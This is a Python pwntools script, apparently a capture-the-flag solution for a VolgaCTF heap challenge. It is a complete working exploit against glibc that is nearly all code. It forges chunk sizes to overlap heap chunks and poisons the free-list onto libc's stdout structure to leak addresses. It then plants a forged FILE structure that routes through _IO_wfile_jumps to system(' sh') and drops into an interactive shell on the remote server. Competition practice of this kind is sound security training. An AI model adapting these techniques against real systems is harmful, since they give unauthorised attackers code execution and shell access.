#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def make(idx, size, data=b'A'*8+b'\n'):
  assert 0 <= idx < 7
  assert 1032 < size < 1241
  io.sendlineafter(b'>> ', b'1')
  io.sendlineafter(b': ', str(idx).encode())
  io.sendlineafter(b': ', str(size).encode())
  io.sendafter(b': ', data)

def free(idx):
  assert 0 <= idx < 7
  io.sendlineafter(b'>> ', b'2')
  io.sendlineafter(b': ', str(idx).encode())

def gift(size, data=b'A'*8+b'\n'):
  assert size in [0, 40, 224]
  io.sendlineafter(b'>> ', b'3')
  io.sendlineafter(b': ', str(size).encode())
  if size != 0:  io.send(data)

gdbscript = '''
init-pwndbg
c
'''.format(**locals())

while True:
  try:
    io = remote('ponbaby-1.q.2026.volgactf.ru', 45002)
    for i in range(4): make(i, 0x4b8, b'\x00'*8+p64(0x4b0|1)+b'\n')
    free(0)
    make(0, 0x4b8, b'\x00'*0x4b8+p16((0x4c0*2)|1))
    free(1)
    make(1, 0x418)
    gift(0)
    free(0)
    make(0, 0x4b8, b'\x00'*0x4b8+p16(((0x4c0*2)+0x10)|1))
    free(1)
    make(1, 0x4b8, b'\x00'*0x418+p64(0x300|1)+p16(7)+p16(6)+p16(7)*2+(p16(7)*4)*(0x90//8)+p16(0x4d0|1|(1<<1)))
    make(4, 0x4c8, p16(9<<12|libc.sym._IO_2_1_stdout_&0xfff)+b'\n')
    gift(0x28, p64(0xfbad1800)+p64(0)*3+b'\x00'+b'\n')
    leak=u64(io.recv(8))
    if (0x700000000000 <= leak <= 0x7fffffffffff) and (leak&0xfff==0x644):
      libc.address=leak-0x234644
      log.info(hex(libc.address))
      break
  except: pass

free(0)
make(0, 0x4b8, b'\x00'*0x4b8+p16(((0x4c0*2)+0x10)|1))
free(1)
make(1, 0x4b8, b'\x00'*0x418+p64(0x300|1)+(p16(7)*4)*3+p16(7)+p16(6)+p16(7)*2+(p16(7)*4)*(0x78//8)+b'\n')
make(5, 0x4c8, p64(0)*12+p64(libc.sym._IO_2_1_stdout_)+b'\n')

fs = flat(
    {
        0x00: b" sh\x00",
        0x08: p64(0),
        0x20: p64(0),
        0x28: p64(1),
        0x68: libc.symbols["system"],
        0x88: libc.symbols["_IO_stdfile_0_lock"],
        0xa0: libc.sym._IO_2_1_stdout_-0x10,
        0xc0: p64(0),
        0xd0: libc.sym._IO_2_1_stdout_,
        0xd8: libc.symbols["_IO_wfile_jumps"]-0x38+0x18,
    },
    filler=b'\x00'
)

gift(0xe0, fs)
io.interactive()
